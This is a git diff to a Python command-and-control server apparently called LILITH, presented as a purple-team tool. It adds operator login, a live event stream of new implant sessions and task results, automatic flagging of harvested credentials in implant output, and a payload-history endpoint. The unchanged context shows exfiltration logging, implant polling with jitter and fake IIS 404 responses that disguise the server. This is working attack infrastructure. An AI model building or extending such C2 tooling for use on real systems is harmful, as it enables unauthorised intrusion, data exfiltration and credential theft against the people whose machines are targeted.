@@ -24,6 +24,7 @@ import http.server
 import os
 import json
 import base64
+import queue
 import random
 import time
 import secrets
@@ -74,6 +75,55 @@ _MIME = {
 }
 
 _EXFIL_LOG: list[tuple[str, str, str]] = []
+_START_TIME = time.time()
+
+# ── Web UI auth ──────────────────────────────────────────────────────────────
+_UI_TOKEN    = ""           # empty → auth disabled
+_UI_SESSIONS: dict = {}     # cookie_val → expiry datetime
+_UI_SESS_TTL = 28800        # 8h
+
+def set_ui_token(token: str) -> None:
+    global _UI_TOKEN
+    _UI_TOKEN = token.strip()
+
+def _ui_auth_ok(headers) -> bool:
+    if not _UI_TOKEN:
+        return True
+    for part in headers.get("Cookie", "").split(";"):
+        k, _, v = part.strip().partition("=")
+        if k.strip() == "lilith_sess":
+            exp = _UI_SESSIONS.get(v.strip())
+            if exp and exp > datetime.now():
+                return True
+    return False
+
+_LOGIN_HTML_TPL = (
+    '<!doctype html><html><head><meta charset="utf-8"><title>LILITH // AUTH</title>'
+    '<style>*{{box-sizing:border-box;margin:0;padding:0}}'
+    'body{{height:100vh;display:flex;align-items:center;justify-content:center;'
+    'background:#060606;color:#ccc;font:12px/1.5 "Cascadia Code",monospace}}'
+    'form{{display:flex;flex-direction:column;gap:12px;min-width:300px;'
+    'padding:32px;border:1px solid #1a1a1a;background:#0d0d0d}}'
+    '.logo{{font-size:16px;font-weight:700;color:#ef4444;letter-spacing:.05em;'
+    'text-align:center;margin-bottom:4px}}'
+    '.logo span{{color:#555;font-weight:400}}'
+    '.sub{{text-align:center;font-size:10px;letter-spacing:.12em;color:#555;margin-bottom:4px}}'
+    'input{{background:#111;border:1px solid #252525;color:#ccc;'
+    'font:12px "Cascadia Code",monospace;padding:8px 10px;border-radius:2px}}'
+    'input:focus{{outline:none;border-color:#c81e1e}}'
+    'button{{background:#c81e1e;border:none;color:#fff;font:12px "Cascadia Code",monospace;'
+    'padding:8px;cursor:pointer;letter-spacing:.1em}}'
+    'button:hover{{background:#ef4444}}'
+    '.err{{color:#f87171;font-size:11px;text-align:center}}'
+    '</style></head><body>'
+    '<form method="post" action="/ui/login">'
+    '<div class="logo">LILITH <span>// C2</span></div>'
+    '<div class="sub">OPERATOR AUTHENTICATION</div>'
+    '{err}'
+    '<input type="password" name="password" placeholder="operator token" autofocus>'
+    '<button type="submit">AUTHENTICATE</button>'
+    '</form></body></html>'
+)
 
 # ── Engagement DB (optional — set by cmd_serve) ──────────────────────────────
 _ENGAGE_DB = None   # type: core.engage.EngagementDB | None
@@ -81,6 +131,23 @@ _ENGAGE_DB = None   # type: core.engage.EngagementDB | None
 def set_engage_db(db) -> None:
     global _ENGAGE_DB
     _ENGAGE_DB = db
+
+# ── SSE pub/sub ──────────────────────────────────────────────────────────────
+_sse_clients: list = []
+_sse_lock = threading.Lock()
+
+def _sse_publish(event: dict) -> None:
+    with _sse_lock:
+        dead = [q for q in _sse_clients if not _sse_send(q, event)]
+        for q in dead:
+            _sse_clients.remove(q)
+
+def _sse_send(q: queue.Queue, event: dict) -> bool:
+    try:
+        q.put_nowait(event)
+        return True
+    except queue.Full:
+        return False
 
 # ── C2 session registry ──────────────────────────────────────────────────────
 _C2_SESSIONS: dict = {}
@@ -193,8 +260,31 @@ class _Handler(http.server.BaseHTTPRequestHandler):
             self._handle_agent_sc()
             return
 
+        # SSE event stream (requires auth when token is configured)
+        if raw_path == "/ui/api/stream":
+            if not _ui_auth_ok(self.headers):
+                self.send_response(401); self.end_headers(); return
+            self._handle_sse()
+            return
+
         # Purple team web UI
         if raw_path.startswith("/ui"):
+            # login page — unauthenticated
+            if raw_path.rstrip("/") == "/ui/login":
+                err = '<div class="err">invalid token</div>' if "err=1" in self.path else ""
+                body = _LOGIN_HTML_TPL.format(err=err).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+                return
+            if not _ui_auth_ok(self.headers):
+                self.send_response(302)
+                self.send_header("Location", "/ui/login")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
             db = _ENGAGE_DB
             if db is None:
                 body = b'{"error":"db not initialized"}'
@@ -238,6 +328,8 @@ class _Handler(http.server.BaseHTTPRequestHandler):
 
         ts = datetime.now().strftime("%H:%M:%S")
         print(f"[{ts}] GET  {raw_path} → {self.client_address[0]}  ({len(data):,}B)")
+        _sse_publish({"type": "file_served", "name": basename, "client": self.client_address[0],
+                      "size": len(data), "ts": ts})
         if _ENGAGE_DB:
             _ENGAGE_DB.log_event("file_served",
                                  f"{basename} → {self.client_address[0]}",
@@ -250,8 +342,23 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         length = int(self.headers.get("Content-Length", 0))
         body_raw = self.rfile.read(length) if length else b""
 
+        # UI login (unauthenticated)
+        if raw_path.rstrip("/") == "/ui/login":
+            self._handle_ui_login(body_raw)
+            return
+
         # Purple team web UI (POST — label endpoint)
         if raw_path.startswith("/ui"):
+            if not _ui_auth_ok(self.headers):
+                self.send_response(302)
+                self.send_header("Location", "/ui/login")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            # logout (auth already checked above)
+            if raw_path == "/ui/api/logout":
+                self._handle_ui_logout()
+                return
             db = _ENGAGE_DB
             if db is None:
                 body = b'{"error":"db not initialized"}'
@@ -286,9 +393,44 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         else:
             self._handle_callback(token, body_raw)
 
+    def _handle_sse(self):
+        q: queue.Queue = queue.Queue(maxsize=512)
+        with _sse_lock:
+            _sse_clients.append(q)
+        try:
+            self.send_response(200)
+            self.send_header("Content-Type",  "text/event-stream")
+            self.send_header("Cache-Control", "no-cache")
+            self.send_header("Connection",    "keep-alive")
+            self.end_headers()
+            self.wfile.write(b'data: {"type":"hello"}\n\n')
+            self.wfile.flush()
+            while True:
+                try:
+                    msg = q.get(timeout=20)
+                    self.wfile.write(("data: " + json.dumps(msg) + "\n\n").encode())
+                    self.wfile.flush()
+                except queue.Empty:
+                    self.wfile.write(b": ping\n\n")
+                    self.wfile.flush()
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+        finally:
+            with _sse_lock:
+                try:
+                    _sse_clients.remove(q)
+                except ValueError:
+                    pass
+
     def do_DELETE(self):
         raw_path = self.path.rstrip("/")
         if raw_path.startswith("/ui"):
+            if not _ui_auth_ok(self.headers):
+                self.send_response(302)
+                self.send_header("Location", "/ui/login")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
             db = _ENGAGE_DB
             if db is None:
                 body = b'{"error":"db not initialized"}'
@@ -306,6 +448,38 @@ class _Handler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(resp)
         else:
             self._send_iis_404()
+
+    def _handle_ui_login(self, body: bytes):
+        import urllib.parse
+        try:
+            pw = dict(urllib.parse.parse_qsl(body.decode())).get("password", "").strip()
+        except Exception:
+            pw = ""
+        if _UI_TOKEN and pw == _UI_TOKEN:
+            tok = secrets.token_urlsafe(32)
+            _UI_SESSIONS[tok] = datetime.now() + timedelta(seconds=_UI_SESS_TTL)
+            self.send_response(302)
+            self.send_header("Set-Cookie",
+                f"lilith_sess={tok}; HttpOnly; SameSite=Strict; Path=/; Max-Age={_UI_SESS_TTL}")
+            self.send_header("Location", "/ui/")
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+        else:
+            self.send_response(302)
+            self.send_header("Location", "/ui/login?err=1")
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+
+    def _handle_ui_logout(self):
+        for part in self.headers.get("Cookie", "").split(";"):
+            k, _, v = part.strip().partition("=")
+            if k.strip() == "lilith_sess":
+                _UI_SESSIONS.pop(v.strip(), None)
+        self.send_response(302)
+        self.send_header("Set-Cookie", "lilith_sess=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0")
+        self.send_header("Location", "/ui/login")
+        self.send_header("Content-Length", "0")
+        self.end_headers()
 
     # ── C2 handlers ───────────────────────────────────────────────────────────
 
@@ -351,6 +525,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         if _ENGAGE_DB:
             _ENGAGE_DB.log_session(session_id, self.client_address[0])
             _ENGAGE_DB.log_event("register", f"src={self.client_address[0]}", session_id=session_id)
+        _sse_publish({"type": "session_new", "id": session_id, "host": self.client_address[0], "ts": ts})
 
     def _handle_c2_poll(self, session_id: str):
         time.sleep(random.uniform(0.05, 0.15))
@@ -404,10 +579,15 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         print(f"{'─'*60}")
         print(output.rstrip() if output.strip() else "[no output]")
         print(f"{'─'*60}\n")
+        has_creds = False
         if _ENGAGE_DB:
             is_bin = output.startswith("_BIN_B64:\n")
             _ENGAGE_DB.log_result(task_id, session_id, output, is_binary=is_bin)
             _ENGAGE_DB.touch_session(session_id)
+            from core.engage import detect_creds
+            has_creds, _ = detect_creds(output)
+        _sse_publish({"type": "task_result", "task_id": task_id, "session_id": session_id,
+                      "has_creds": has_creds, "ts": datetime.now().strftime("%H:%M:%S")})
 
     def _handle_callback(self, token: str, body: bytes):
         output = _decode_exfil(body)
@@ -474,6 +654,12 @@ class _MgmtHandler(http.server.BaseHTTPRequestHandler):
             if result is None:
                 self.send_response(204); self.end_headers(); return
             self._json(json.dumps({"output": result}).encode()); return
+
+        # GET /mgmt/payloads  — payload version history (Astaroth MCP integration point)
+        if parts == ["mgmt", "payloads"]:
+            from server.ui import _api_arsenal_versions
+            body = json.dumps(_api_arsenal_versions(), indent=2).encode()
+            self._json(body); return
 
         self.send_error(404)
 
